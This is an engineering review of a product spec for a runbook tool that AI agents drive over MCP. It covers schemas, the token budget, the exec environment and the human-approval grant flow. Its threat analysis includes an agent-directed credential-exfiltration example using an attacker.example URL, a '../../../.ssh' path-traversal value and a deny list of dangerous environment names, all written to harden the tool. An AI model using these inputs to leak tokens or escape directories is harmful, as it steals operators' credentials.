# dops-next PRD review

**Date:** 2026-09-11
**Reviewed:** `docs/design/05-prd.md` on `sd/dops/prd` at `72d7e49`
**Against:** `01-audit.md`, `02-competitors.md`, `03-principles.md`, `06-session-mining.md` (same commit), the Go product at `~/origin/dops` `795d2d2`, and the reference catalog `~/Bitbucket/sdo-dops-catalog` (`091b7ed`, 32 `src/*/runbook.yaml`)
**Role:** independent review. This document does not rewrite the PRD. The revision is a separate task.
**Codename:** dops-next. §10 lists what a rename to kadou would touch. It does not apply that rename.

No secrets appear here. The vault test in Appendix B used a synthetic payload. No real `jenkins_token`, `~/.dops/vault.json`, or `envs/*.env` file was read.

---

## 0. Verdict

**Revise before implementation.** The architecture is right. It keeps four constant meta-tools, loads v1 files through a compatibility loader, keeps the age vault, and ships mining as a crate plus a CLI instead of extra MCP tools. Those choices hold up against every input.

The PRD is not an implementable contract yet, for four reasons:

1. **It fails its own token gate.** The four tool schemas in §5.4 serialize to **3,845 compact bytes**. That is about 961 tokens at 4 bytes per token, against a budget of ≤ 800 tokens and a CI gate of 3,200 bytes. Rust types that rmcp 3.3.0 would serialize still come to 3,553 bytes. A trimmed rewrite in Appendix A is 2,018 bytes, so the budget is reachable.
2. **The agent safety story has three open paths that §6 does not close:**
   - MCP-spawned children inherit the parent environment.
   - An agent can override `jenkins_url` and send the vault's `jenkins_token` to a host of its choosing.
   - History logs are not redacted, yet `log_path` hands them to the agent.
3. **The grant model contradicts itself.** §5.5, §6.4, and slices 5–6 disagree with §6.2 and §6.3 about when `pending_grant` happens.
4. **The slice plan ships agent execution before its audit trail.** Slice 5 returns `history_id` and `log_path`, but history is built in slice 6. It also runs `starter.*` runbooks, but the starter catalog is embedded in slice 8. Three Sesami runbooks that trigger Jenkins are at `low`, so a default agent can fire them on the day slice 5 ships.

Section 8 lists 15 blocking revisions, ranked, each tied to the slice it blocks. Slice 1 is blocked only by B10 (the XDG crate). Slice 2 is blocked by B9 (loader coercion, known keys, `catalog.yaml`) and B15 (CI fixtures). Slice 5 is blocked by B1–B8, B11, and B14.

Closed by this review: the PRD marks importing a Go-format vault as **unverified**. It works. age 0.12.1 decrypted a vault and `keys.txt` written by dops's own `internal/crypto/age.go` (Appendix B).

---

## 1. Verdict per PRD section

Legend: **Accept** means implement as written. **Revise** means the direction is right and the text needs the listed change. **Reject** means remove or replace the sub-decision. `B#` points to §8.

| PRD § | Verdict | Evidence | Change |
|---|---|---|---|
| Header / inputs | Accept | Inputs and commit match the tree. The reference catalog count (32) matches disk. | §12 should drop the "unverified Go import" limit (B-list note). |
| 1.1 What it is | Accept | Matches `03` charter 8, 9, 13 and `01` §2.1. | — |
| 1.2 Users | Revise | Operators "save … `jenkins_token` once in the vault", but no command in §7.1 does that securely (see 7.3). | B13 |
| 1.3 Success metrics | Revise | The ≤ 800-token connect target is right, but §5.4's own schemas measure 961 tokens at 4 bytes per token (§3.1 below). The "Sesami import" metric requires `describe_runbook` round-trips. At the default agent ceiling (`low`), 27 of 32 runbooks return `no such runbook` by design (§6.2). The metric must name its test ceiling. | B1 |
| 2 row 1 (tool shape) | Accept | Constant surface; `01` §6.2, `02` §7.1 and §7.8, `03` §8 rule 1. `03` overriding `02`'s opt-in per-runbook tools is correct. | — |
| 2 row 2 (format v2) | Revise | The v1 table (§4.3) already defaults `name` and `script`. What v2 actually changes is `format_version`, `catalog.yaml`, and a narrower type set, and the row should say so. `catalog.yaml` scope is unsafe as written (§6 below). | B9 |
| 2 row 3 (catalog identity) | Accept | `01` §4.9. Note that `dops catalog add --name/--path` are new flags; Go `add` has neither (`cmd/catalog.go:73-122`). | S-list |
| 2 row 4 (confirm) | Revise | The per-level table is coherent, but §5.5, §6.4, and slices 5–6 contradict it (§4.4 below). | B4 |
| 2 row 5 (ceilings) | Revise | `min(agent, catalog, human)` conflicts with Go semantics (catalog policy *replaces* the global, `01` §2.3) and with the §7.5 comment "raise [catalog policy] to critical to even *see* ses-deploy". | B4 |
| 2 row 6 (vault) | Revise | Import verified (Appendix B). The `keyring` crate choice is wrong (§5). There is no secret-entry verb. | B12, B13 |
| 2 row 7 (script contract) | Accept | `/bin/sh <path>` matches Go `ShellFor` (`internal/executor/shell_unix.go`). The Sesami shared helper keeps bash because `script.sh` executes it directly (exec bit set). | Document the cwd change (§4.1). |
| 2 row 8 (history) | Revise | Drops the v0.12 spec's 7-day plain-text tier without saying so (`specs/VERSION_0_12_0.md:22-26`). That makes `log_path` a gz-tar entry agents cannot read. Logs are not redacted. | B3 |
| 2 row 9 (skills) | Accept | `01` §4.8; `03` §8 rule 3. | — |
| 2 row 10 (web/TUI) | Accept | `03` charter 13 beats `01` rank 14–15's "defer". | — |
| 2 row 11 (compat tests) | Revise | CI cannot read `~/Bitbucket/sdo-dops-catalog`. The fixture policy is undefined. | B15 |
| 2 row 12 (strict loader) | Revise | Right principle. Three things are missing: coercing string defaults (87 in Sesami), the complete known-key list, and per-catalog (not per-process) failure. | B9 |
| 2 row 13 (secret flag) | Accept | 29/29 `jenkins_token` are `secret: true`, type `string`, no default. | — |
| 2 row 14 (addressing) | Revise | Staging ids and layout for `proposed/` do not fit the one-level loader (§3.6 below). | B14 |
| 2 row 15 (mining MCP) | Accept | Folding `mine_*` into list/describe is right under `03` §8 rule 1. Staging fixes are in B14. | — |
| 3 Workspace layout | Accept (minor) | Six crates with one engine shared by three faces, per `01` §2.1. `catalogs/starter/` sits outside the `dops` crate, which breaks `cargo package` for rust-embed. | S-list |
| 3.1 Dependencies | Revise | Versions and licenses match crates.io exactly (§5). **Reject** `directories` (macOS paths, no state dir). **Reject** bare `keyring` 4.2.0 (upstream says apps should not link it; it breaks MSRV on Linux). Missing: `flate2`, `tar`, a diff crate, a process-group kill, `base64`, and runtime `tempfile`. | B10, B12 |
| 4.1 On-disk layout | Revise | **Reject** "operator sets `active = true` on `mined`". It is a bulk accept that bypasses `dops catalog accept` (`03` §11 rule 2). | B14 |
| 4.2 Identity | Accept | `01` §2.6–2.7. | — |
| 4.3 v1 compatibility | Revise | 32/32 load strictly with the right key set (Appendix B). The table omits known v1 keys (`trigger`, `aliases`, `description`, `version`, `parameters`), and does not say how string defaults coerce. | B9 |
| 4.4 v2 | Accept | Six author types. `..` and absolute `script:` rejected. | Env-name rule in B6. |
| 4.5 `catalog.yaml` | Revise | As written, shared params apply to every runbook, which would push `JENKINS_TOKEN` into the three non-Jenkins runbooks. | B9 |
| 4.6 Parameter resolution | Revise | Carrying the merge order as-is lets MCP `args` override global-scope values (`jenkins_url`). The PRD does not say MCP never writes the vault. | B2 |
| 4.7 Loader strictness | Revise | "CLI/TUI/MCP all refuse to start" when any active catalog has one bad file. That bricks the starter catalog too (`03` charter 2). | B9 |
| 5.1 Default surface | Revise | Empty `resources/list`/`prompts/list` still costs round-trips. Do not advertise those capabilities. HTTP transport needs Origin and a token. | B11, S-list |
| 5.2 Progressive disclosure | Accept (with cap) | The layering is right. Script bodies need a byte cap. | B1 |
| 5.3 Multi-catalog addressing | Revise | Staging visibility against the ceiling is undefined. | B14 |
| 5.4 Tool input schemas | Revise (**blocking**) | Line-by-line findings in §3.2. Over budget. The `propose_runbook.catalog` field allows path traversal. | B1, B7 |
| 5.5 Result shapes | Revise | Pretty-printed JSON, a duplicated parameter schema, undefined `isError`/`summary`, a `pending_grant` reason that cannot happen, and an unreadable `log_path`. | B1, B3, B4 |
| 5.6 Agent config snippet | Accept | `03` §3 rule 5. | Rename note (§10). |
| 6.1 Exec contract | Revise (**blocking**) | Parent environment, no timeout, no cancel wiring, no concurrency limit, no reserved env names, no args-to-env serialization. | B5, B6 |
| 6.2 Ceilings | Revise | Formula ambiguity (see row 2.5). | B4 |
| 6.3 Unified confirm | Accept (table) | The table is the right model. The rest of the PRD must match it. | B4 |
| 6.4 Grant flow | Revise | No TTL, dedupe, or script pin. No way for the agent to see the outcome. The approve rule mentions critical but not high. | B4 |
| 6.5 Secret handling | Revise | Import verified. The envelope encoding is not specified. Keyring semantics are stated two ways. `passphrase_cmd` is a code-execution knob. | B12, B13 |
| 6.6 History | Revise | Logs are not redacted. Redaction of encoded forms is missing. Retention for pending and proposal records is undefined. | B3 |
| 6.7 Propose / accept | Revise | Accept into non-user catalogs is undefined (writes into `~/.config/dops/catalogs/<git-backed-name>/`). No diff confirmation. | B7 |
| 6.8 Mining | Accept | Correct packaging override of `06` §5.1. The miner must write `format_version: 2` (the `06` §6.4 draft is v1-shaped with `type: number`). | B14 |
| 7.1 Command tree | Revise | Add `dops vault set`. Everything else is fine. | B13 |
| 7.2 Keybindings | Revise | `Ctrl+Shift+p` is only distinguishable from `Ctrl+p` in terminals that speak an enhanced keyboard protocol (kitty/CSI-u). Terminal.app does not. `03` §5 rule 3 allows a successor chord. | S-list (slice 8) |
| 7.3 First-run | Revise | "`dops config set` … `jenkins_token`" contradicts §7.5 ("No parameter values in TOML") and `03` §6 rule 4. | B13 |
| 7.4 Installer | Accept | Checksum verification, POSIX shell, idempotent. Publishing is gated. | — |
| 7.5 Config | Revise | `[mine] catalog` configurable breaks name-keyed staging checks. `vault.passphrase_cmd` and `mcp.max_output_lines` are knobs outside `03` §7 rule 5's closed list. | B14, S-list |
| 7.6 Starter catalog | Revise (**blocking**) | Param `path` becomes env `PATH=.`, so `df`, `git`, and `ls` fail in `disk-usage`, `git-status`, and `list-path`. `getent` does not exist on macOS. | B6 |
| 8.1 Non-goals | Accept | Faithful to `03`. | — |
| 8.2 Risks | Revise | Missing: parent-env leak, arg-override exfiltration, long-running runs, and the byte gate as a weak token proxy. | B1, B2, B5 |
| 9 Slice plan | Revise (**blocking**) | Order and done checks detailed in §7. | B8 |
| 10 Crate log | Accept | Every row re-verified on 2026-09-11 (§5). | — |
| 11 Decision index | Accept | Index only. | Follows the revisions. |
| 12 Deviations | Revise | The Go import is now verified. Keep the other limits. | — |

---

## 2. Contradictions with the 03 charter and the 01 keep/drop table

| # | PRD location | Conflicts with | What breaks | Fix |
|---|---|---|---|---|
| C1 | §3.1 `directories` 6.0.0; §7.5 paths | `03` §1 rule 1, §6 rule 2, convention table (`~/.config/dops/config.toml`) | `directories` maps config and data to `~/Library/Application Support` on macOS and returns `state_dir: None` (`directories-6.0.0/src/mac.rs:12,28,68,83`). Mason is on macOS. | B10 |
| C2 | §5.4 schemas vs §1.3 and §8.2 budget | `03` §8 rule 6 ("a principles violation, not a feature") | 3,845 B verbatim is ~961 tokens at 4 B/token, above the 3,200 B gate. | B1 |
| C3 | §5.5 `pending_grant` reason "critical exceeds agent allow_risk low"; §6.4 step 1; slice 6 tests | `03` §10 rule 3 (above-ceiling is invisible); PRD §6.2; slice 5 test "run above ceiling → no such runbook" | A default agent gets `pending_grant` in one place and `no such runbook` in another. `pending_grant` for a hidden id also reveals that the id exists. | B4 |
| C4 | §6.1 "parent environ + declared params" | `03` §10 rule 4, charter 10 ("Secrets never cross MCP") | MCP children inherit the agent host's environment, including provider API keys and cloud tokens. Any script output (`env`, `set -x`, error dumps) goes back to the agent. Only vault values are redacted (§5.5). | B5 |
| C5 | §4.6 resolution "carry as-is" and `args` override | `03` §10 rule 4; `02` §7.6 (operator-owned argv) | An agent sends `args: {"jenkins_url": "https://attacker.example"}`. The vault injects `JENKINS_TOKEN`, and `trigger-pipeline.sh` sends `-u user:token` to that host. The secret never crosses MCP, but it leaves the machine at the agent's direction. | B2 |
| C6 | §7.3 "`dops config set` … `jenkins_token`" | `03` §6 rule 4; PRD §7.5 "No parameter values in TOML" | No command stores a secret without putting it in TOML, argv, or shell history. | B13 |
| C7 | §4.1, §6.8 "or the operator sets `active = true` on `mined`" | `03` §11 rule 2 (accept moves a draft into a user catalog); `03` §6 rule 2 (`~/.local/share` is product-owned) | Activating `mined` makes every later `dops mine approve` executable without a per-runbook accept. It also turns a product-owned directory into a live catalog. | B14 |
| C8 | §7.5 `[mine] catalog = "mined"` configurable | `03` §7 rule 5 (closed configurable list); PRD §5.3 name-keyed staging | Renaming the staging catalog defeats `run_runbook`'s staging refusal if that check keys on the name. | B14 |
| C9 | §7.6 starter params named `path` | `03` §2 rule 1 and §3 rule 2 (install = ready); §9 rule 6 | Three of the five starter runbooks fail on first run (`PATH=.`). | B6 |
| C10 | §9: MCP runs in slice 5, history in slice 6 | `03` §11 rule 5 (every execution records its initiator); `01` rank 9 | Agent runs, including three low-risk Jenkins triggers, with no audit record. §5.5's `history_id`/`log_path` point at nothing. | B8 |
| C11 | §9 slices 3 and 5 use `starter.hello-world`; the embed is slice 8 | `03` charter 2–3 | The done checks reference a catalog that does not exist yet. | B8 |
| C12 | §6.7 accept "copies into `~/.config/dops/catalogs/<catalog>/`" for any `catalog` | `03` §11 rule 2 (into a *user* catalog), rule 6 (no silent git) | `catalog: "jenkins-pipelines"` creates a second, shadow directory for a git-backed catalog. That clashes with "registers it if missing" (it is already registered at another path). | B7 |
| C13 | §5.2 describe returns `script.sh` only | `03` §9 rule 3 ("read before run … or a way to read it") | For 29 Sesami runbooks the logic is `scripts/trigger-pipeline.sh` (12,861 B, bash), which describe never returns. The agent reads a 2 KB wrapper and runs a 13 KB program. | S-list (return `catalog_root` and a helper list) |
| C14 | §5.1 HTTP loopback without auth | `03` §10 rule 5 ("No unauthenticated remote MCP") | Loopback is reachable by every local process. rmcp 3.3.0 defaults `allowed_origins` to empty, which **disables** Origin validation (`streamable_http_server/tower.rs:113-119`). The Host check does default on (`["localhost","127.0.0.1","::1"]`, line 190). | B11 |
| C15 | Decision 8 (history) | `01` §3.3 and Q8 cite the v0.12 lifecycle (fresh < 7 d plain text, compressed 7–90 d, expired > 90 d, 50 MB cap) | The PRD keeps the TTL and cap and silently drops the fresh plain-text tier. That tier is what makes `log_path` useful to an agent (`02` §7.4). | B3 |
| C16 | §6.1 cwd = runbook dir | `01` §4.11 (Go executor sets no `cmd.Dir`; `internal/executor/script.go:26-27`) | A behavior change presented as a port. Sesami is unaffected (every script uses `dirname "$0"`), but it should be documented. | S-list |
| C17 | §4.6, §5.4 silent on MCP vault writes | `01` §4.4 ("MCP and TUI persist through their own paths"). Go MCP actually never saves (`internal/mcp/tools.go:74-87` resolves only). | If MCP args were saved at `global` scope, an agent could poison `jenkins_url` for later human runs. | B2 |
| C18 | §9 slice 7 puts `propose_runbook` in MVP | `01` rank 13 ("defer create-runbook") | Reconciled correctly: `03` §8 rule 1 and §11 require the propose tool. Not a defect. | — |
| C19 | §9 slice 8 TUI in MVP | `01` rank 15 ("defer TUI") | Reconciled correctly by `03` charter 13. Not a defect. | — |

---

## 3. MCP surface review

### 3.1 Token budget, measured

Bytes are compact `{"tools":[…]}` with `name`, `description`, and `inputSchema`. Token estimates use 4 B/token (the PRD's rule) and 3.5 B/token (`01` §6.1's punctuation-heavy rule).

| Payload | Bytes | ≈ tok @4 | ≈ tok @3.5 | Within ≤ 800? |
|---|---:|---:|---:|---|
| PRD §5.4 verbatim, 4 tools | 3,845 | 961 | 1,099 | **No** |
| PRD §5.4 without `$schema`/`$id`/`title` | 3,347 | 837 | 956 | **No** |
| PRD §5.4 verbatim, 3 tools (slice 5) | 2,752 | 688 | 786 | Yes, until slice 7 adds the fourth |
| rmcp 3.3.0 + schemars 1.2.2 from equivalent Rust types, 4 tools | 3,553 | 888 | 1,015 | **No** |
| Appendix A trimmed schemas, 4 tools | 2,018 | 504 | 577 | Yes, with room for tool annotations |

What rmcp actually emits (probe, Appendix B): `schema_for_input` keeps `"$schema":"https://json-schema.org/draft/2020-12/schema"`, renders `Option<T>` as `"type":["string","null"]`, turns an optional enum into `$defs` + `anyOf`/`$ref`, adds `"format":"uint32"`, and strips only the root `title`/`description` (`rmcp-3.3.0/src/handler/server/common.rs:30,59`). The PRD's hand-written JSON is therefore not what a derive-based server serves.

The implementation should author `inputSchema` as checked-in JSON passed to `Tool::new(name, desc, Arc<JsonObject>)` (`model/tool.rs:163`). Use serde/schemars only to deserialize arguments. The snapshot test should cover the bytes the server actually serves.

The gate itself is loose. 3,200 B equals 800 tokens only at 4 B/token; at 3.5 it is 914. Gate at **2,800 B**, or count with a tokenizer. The budget should also count the `initialize` result: `serverInfo`, plus `instructions`, which several hosts inject into the system prompt. The PRD counts only three list calls.

### 3.2 The four tool schemas, line by line

**All four roots**

| Line | Finding | Fix |
|---|---|---|
| `"$schema"` | 50 B per tool. MCP 2025-11-25 already defaults to 2020-12. | Drop from the wire. Keep it in the doc. |
| `"$id": "dops://schema/tools/…"` | No consumer. A custom URI scheme. Also a rename touchpoint. | Drop. |
| `"title"` | Duplicates `name`. | Drop. |
| `"additionalProperties": false` | Correct. rmcp emits it when the Rust type has `#[serde(deny_unknown_fields)]`. | Keep. |

**`list_runbooks`** (1,136 B verbatim)

| Property | Finding | Fix |
|---|---|---|
| description | Fine. "Returns names and one-line descriptions only" is useful to the model. | Shorten (Appendix A). |
| `query` | Fine. No `maxLength`. | Optional `maxLength: 200`. |
| `catalog` | Fine for a filter. No filesystem use. | — |
| `risk` | "Exact" filter. The ceiling still applies server-side. Correct. | — |
| `limit` 1..200, default 50 | The schema is fine. The result is the cost: 30 Sesami entries at a medium ceiling pretty-print to 9,260 B (~2,315 tokens). | Compact JSON results (§3.3). |
| `offset` | No description. Fine. | — |
| `include_staging` | The wire description cites "06 §5.3" and "mine_list use case", which is meaningless to a model and costs tokens. The claim "Equivalent to catalog=mined" is **wrong**: `include_staging` adds staging entries to active ones, while `catalog=mined` lists only `mined`. Staging visibility against the agent ceiling is undefined (§3.6). | Rewrite as "Also list non-runnable drafts (mined, proposed)." Define ceiling behavior. |

**`describe_runbook`** (645 B verbatim)

| Property | Finding | Fix |
|---|---|---|
| `id` | Fine. | — |
| `include_script`, default `true` | Planner question. Keeping the default on is right under `03` §9 rule 3, which beats `02` §7.2 layer 3. Sesami `script.sh` is 762–3,809 B, about 950 tokens at worst. There is no cap, and catalogs can hold anything. | Keep the default. Cap at 16 KiB with `script_truncated: true` and always return `script_sha256`. Add `catalog_root` so an agent can read shared helpers with its own file tools (C13). |

**`run_runbook`** (961 B verbatim)

| Property | Finding | Fix |
|---|---|---|
| description | Correct policy text, but true only when the runbook is visible (§4.4). | Rephrase: "Above your grant it does not run; it returns pending_grant." |
| `id` | Fine. | — |
| `args` | `"default": {}` and `"additionalProperties": true` are fine. The description's "Do not send _confirm_id or _confirm_word; those fields do not exist" primes the model with those exact tokens and spends about 20 tokens on every connect. **Serialization to env is undefined.** Go uses `fmt.Sprintf("%v", v)` (`internal/mcp/tools.go:86`), so a `multi_select` array becomes `"[a b]"`. | Delete the confirm sentence. Specify per type: string as-is; boolean `true`/`false`; integer and float as JSON number text; `select` validated against `options`; `multi_select` comma-joined, with commas in options rejected at load; object and null rejected. Reject secret names and `global`/`catalog`-scope names (B2). |
| `dry_run` | The description says "return the would-be command", but the result has no command field. | Say "resolve args and env names without executing". |
| missing | No execution-time bound. Sesami Jenkins runs last as long as the build (§4.1). | Server-side `exec.timeout` and `mcp.max_wait` returning `status: running` (B5). No new property needed. |

**`propose_runbook`** (1,092 B verbatim)

| Property | Finding | Fix |
|---|---|---|
| `catalog` | **No pattern.** The server writes `~/.local/state/dops/proposed/<catalog>/<name>/` (§6.7), so `catalog: "../../../.ssh"` escapes the state directory. | `pattern: ^[a-z0-9][a-z0-9-]*$`, plus server-side canonicalize-and-contain (B7). |
| `name` | Pattern fine. No `maxLength`. | `maxLength: 64`. |
| `description` | `minLength: 1`, no max. | `maxLength: 200`. |
| `risk_level` default `low` | Agent-authored scripts are unreviewed, and `06` §4.4 refuses `low` for mined drafts on the same reasoning. A silent default hides the choice from the reviewer. | Make it required with no default. |
| `yaml` + `name`/`description`/`risk_level` | Precedence when both are present is undefined. | Reject on mismatch. `yaml` must pass the strict loader at propose time, and errors go back to the agent. |
| `yaml`, `script` | Unbounded writes. | `maxLength` 16 KiB / 64 KiB. |
| result `pending_id: "user.my-check"` | Same field name as the grant `pending_id` (a UUID) but a different meaning. | Rename to `proposal_id`. |
| missing | Re-propose semantics: overwrite, or version? Is the diff baseline `/dev/null` or the accepted runbook? | Diff against the currently accepted runbook when one exists. Overwrite the prior draft. |

### 3.3 Result shapes

| Shape | Finding | Fix |
|---|---|---|
| All | Pretty-printed JSON is about 28% larger (list at medium: 9,260 B pretty vs 7,256 B compact). | Compact JSON. Omit `aliases: []` and `staging: false`. |
| All errors | "JSON-RPC tool error" for an unknown id conflicts with MCP 2025-11-25's guidance to return input and lookup failures as tool results with `isError: true`, so the model can self-correct. `invalid_args` and `staging` are plain results with no `isError`. | One rule: `isError: true` with `error ∈ {no_such_runbook, invalid_args, staging, timeout}`. A non-zero exit is `status: failed` with `isError: true`. |
| `list_runbooks` | The example says `total: 6`, but §7.6 lists five starter runbooks. | Fix the example. |
| `describe_runbook` | Each parameter appears twice (flat fields plus `json_schema`). `cc4-aaa` in the PRD shape is 6,071 B pretty (~1,518 tokens). One `args_schema` object without the script is **1,408 B** compact. `visible_to_agent` is always true when returned. Required globals with saved values (`jenkins_url`, `jenkins_user`) look required to the agent, so it will try to send them. Go handled this with "required unless a vault value resolves" (`01` §4.2). | Return `args_schema` (one JSON Schema), `secret_param_names`, and `resolved: [names]` (names only, no vault values). Mark resolved params not-required in `args_schema`. Drop `visible_to_agent`. |
| `run_runbook` success | `summary` is undefined. Go uses the last non-empty line (`tools.go` `collectResult`). `log_path` is `….log.gz#<uuid>.log`, a tar entry in a gzip archive that no agent file tool can open (C15). | Define `summary` as the last non-empty line, ≤ 200 chars. `log_path` must be a plain text file for fresh runs (B3). |
| `pending_grant` | The `reason` names a situation §6.2 makes impossible (C3). | Fix it under B4. Add `pending_path` (§4.4). |
| `dry_run` | `env_public` includes vault-resolved non-secret values (`jenkins_user`). That is acceptable, but say it. | State it explicitly. |

### 3.4 Progressive disclosure

Accept. The three layers are list, then describe (args schema plus capped script), then run (bounded output plus a log pointer). They match `02` §7.2. `03` §9 rule 3 is the documented reason for putting the script in layer 2. The only change is the cap and helper pointer (§3.2).

### 3.5 Behavior with eager-loading clients

Correct: an eager client sees four schemas regardless of catalog size (`02` §7.8). Three additions:

1. Advertise only the `tools` capability. Then hosts never call `resources/list` or `prompts/list`. That beats returning empty lists.
2. Add MCP tool annotations: `readOnlyHint: true` on list and describe, `destructiveHint: true` and `openWorldHint: true` on run, `readOnlyHint: false` and `destructiveHint: false` on propose (`rmcp` `model/tool.rs:63-73`). Hosts use them to auto-approve reads. Cost is about 160 B, which Appendix A absorbs.
3. Send no `instructions` in `initialize`, or count them in the budget.

### 3.6 Staging catalog exception

Accept the concept (describe drafts, never run them). Four holes remain:

1. **Visibility against the ceiling.** The miner never assigns `low` (`06` §4.4), so if staging entries are ceiling-filtered, a default agent's `include_staging=true` returns nothing. The PRD must choose. The recommended answer: staging entries are listed and described regardless of ceiling, because they are not executable. `run_runbook` refuses them on the staging flag.
2. **`proposed/` does not fit the loader.** Drafts live at `proposed/<catalog>/<name>/`, two levels deep, but §4.1 scans one level ("Nested catalogs are not supported"). Two proposals named `x` for different catalogs collide as `proposed.x`. Recommended: flatten to `proposed/<catalog>--<name>/`, or id `proposed.<catalog>.<name>` with a dedicated staging loader.
3. **The staging check must key on a flag, not a name.** Make `mined` and `proposed` reserved catalog names and remove `[mine] catalog` (C8).
4. **Remove the `active = true` path (C7).** `dops catalog accept mined.<name> --into <user-catalog>` is the only way a draft becomes runnable. The PRD also never says which catalog `accept mined.<x>` targets. Define `--into`, defaulting to `user`.

---

## 4. Safety review

### 4.1 Exec contract

| Item | PRD | Finding | Required |
|---|---|---|---|
| argv | `/bin/sh <abs>/<script>` | Same as Go (`shell_unix.go`: `sh scriptPath` unless `.ps1`). The shebang is ignored. The Sesami helper `trigger-pipeline.sh` is `#!/usr/bin/env bash`, has its exec bit set, and is invoked directly, so it still gets bash. | Keep. Run tests on Linux too: `/bin/sh` is dash there and bash-in-POSIX-mode on macOS. |
| cwd | runbook dir | A change from Go, which inherits the caller's cwd (C16). Harmless for Sesami. `device-log-metrics` writes `snapshots/` into its own dir either way. | Document it as a change. |
| stdin | closed | Right. Must be `/dev/null`, never the MCP server's stdin. | Test: a script that runs `cat` must not consume JSON-RPC frames. |
| stdout/stderr | merged to history and interface | Must be pipes, never inherited. One stray byte on the MCP server's stdout corrupts the stdio transport. | Test stdout purity under MCP. |
| cancel | "context cancel → process group" | Go sends SIGKILL to the group with a 2 s `WaitDelay` (`proc_unix.go:12-15`, `script.go:33`). The PRD does not wire MCP `notifications/cancelled` or client disconnect. rmcp exposes a per-request `CancellationToken` (`service.rs:349`). | SIGTERM the group, then SIGKILL after 5 s. Trigger on the request token, on stdio EOF, and on `exec.timeout`. |
| timeout | none | `trigger-pipeline.sh` streams the Jenkins console until the build ends. The poll loop uses `LOG_POLL_INTERVAL=3`; `QUEUE_TIMEOUT=300` bounds only the queue wait. So `run_runbook` blocks for the whole build, and MCP hosts enforce per-call timeouts. | `exec.timeout` (default e.g. 30 min). `mcp.max_wait` (e.g. 50 s): after it, return `status: running` with `history_id` and a plain-text `log_path` the agent can tail with its own tools. No fifth tool. |
| concurrency | none | An agent can start N Jenkins triggers in parallel. | A per-server limit (e.g. 2) and one run at a time per runbook id, or return `busy`. |
| env names | `name.to_ascii_uppercase()` | No validity or reserved-name rule. The starter `path` becomes `PATH` (C9). A proposed runbook could declare `ld_preload`. | Loader rule: name `^[a-z][a-z0-9_]*$`. Reject names that uppercase to `PATH`, `HOME`, `PWD`, `OLDPWD`, `IFS`, `SHELL`, `CDPATH`, `BASH_ENV`, `PS4`, `LD_*`, `DYLD_*`, `DOPS_*`. All 24 Sesami names pass. Sesami's `env` → `ENV` must stay allowed: non-interactive `sh` does not read `$ENV`. |
| args → env | undefined | See §3.2 `args`. | Specify per type. |
| output | last 50 lines, 8 KiB | Fine. Non-UTF-8 handling and line-length cap are unspecified. | Lossy UTF-8. Cap lines at 4 KiB. |

### 4.2 Parent environment inheritance (planner note: confirmed)

Go builds the child env as `os.Environ()` plus params (`internal/executor/script.go:27`), and PRD §6.1 keeps that for every interface. Under MCP, the parent is the agent host, whose environment routinely carries API keys and cloud or CI tokens. Output redaction (§5.5) knows only vault values.

**Required (B5):** for `interface = mcp`, start the child from an allowlist: `PATH HOME USER LOGNAME SHELL LANG LC_* TZ TMPDIR SSH_AUTH_SOCK KUBECONFIG`, plus `TERM=dumb`, plus a human-owned `[exec] pass_env = []`. CLI and TUI keep the full environment (human context).

Checked against Sesami:
- The cc4 and `ses-*` wrappers need only declared params plus `PATH`/`HOME`.
- `clone-ses-repos` clones `git@bitbucket.org:…`, so it needs `SSH_AUTH_SOCK`.
- `ses-argocd-sync` needs `KUBECONFIG` or `~/.kube/config` via `HOME`.
- `device-log-metrics` reads `envs/*.env` from its own directory.

The allowlist covers the catalog.

A second secret source outside the vault: when `JENKINS_USER`/`JENKINS_PASS` are unset, `trigger-pipeline.sh` `eval`s `export JENKINS_(USER|PASS)=` lines from `~/.bashrc` (around line 60). Its `--dry-run` also prints `curl -u user:pass` (around line 294). Those are catalog-hygiene issues for Sesami, not PRD issues. They show that redaction must assume scripts print credentials.

### 4.3 Ceilings

The PRD's `min(agent, catalog, human)` leaves one question open. If a catalog policy is `critical` and the global is `medium`, does the human see `ses-deploy`? Go says yes: catalog policy replaces the global (`internal/catalog/loader.go:55-58`, `01` §2.3). The §7.5 comment assumes Go semantics, while the MCP formula caps at the global.

**Required (B4):** state it as follows.

- `human_ceiling(c) = c.policy.max_risk_level ?? defaults.max_risk_level`
- `agent_ceiling(c) = min(agent.allow_risk, --allow-risk, human_ceiling(c))`
- *visible to agent* ⇔ `rank(rb) ≤ agent_ceiling(c)`
- `allowed_runbooks` never raises visibility above `agent_ceiling`. It only decides run-vs-pending for visible high and critical runbooks (the PRD's §6.3 table).

At the default ceiling, a Sesami agent sees exactly five runbooks: `clone-ses-repos`, `device-log-metrics`, `helm-package`, `sdo-k8s-ses`, `ses-automation`. **Three of those trigger Jenkins with the vault token** (`helm-package`, `sdo-k8s-ses`, `ses-automation`; 9 `JENKINS`/trigger references each). "Agent default low" is therefore not "agent cannot touch CI". That is why history, redaction, the env allowlist, and argument locks must ship in slice 5 (B8).

### 4.4 `pending_grant` flow

The §6.3 table is coherent: visible, high or critical, not allow-listed → pending. Everything else must match it:

| Location | Says | Must say |
|---|---|---|
| §5.5 example `reason` | "critical exceeds agent allow_risk low; queued" | Unreachable. Above the ceiling returns `no_such_runbook`. Example reason: "high risk; not in [agent].allowed_runbooks". |
| §6.4 step 1 | Any high/critical without a grant → pending | Only when visible under §4.3. |
| `run_runbook` wire description | Unconditional pending | "Above your grant it does not run" (Appendix A). |
| Slice 6 test | Fixture high without grant → pending (default config) | Test config `allow_risk = "high"`. |
| Slice 6 test | `grant allow` then run succeeds | Needs `allow_risk ≥ high` as well. Test both with and without it. |
| Slice 6 done | "`ses-deploy` cannot run over MCP on a default config" | Vacuous: hidden from everyone at the default human ceiling. Replace with the scenario in §7. |
| §6.4 step 3 | Approve still needs confirm "for critical" | High also requires `--confirm` (§6.3). Say both. |

The pending record is under-specified. Required:

1. **Pin** `script_sha256` and the catalog git HEAD, when there is one, at request time. Refuse approval on mismatch. A `git pull` between request and approval must not swap the program.
2. **TTL** of 24 h. Expired records are listed as expired and cannot be approved.
3. **Dedupe** on `(runbook_id, args_hash)`, returning the existing `pending_id`.
4. **Show** the args and the script diff since the request at `dops grant approve`.
5. **Outcome visible to the agent without a fifth tool.** Return `pending_path` (the record file). On approval the record gains `history_id`, `status`, and `log_path`, which the agent reads with its own file tools (`02` §7.9).
6. **Approval runs in the human CLI's environment,** not the MCP server's. Say it.

Suggested, not blocking: pin `grant allow <id>` to a script digest, with `--any-version` to opt out.

### 4.5 Vault and keyring

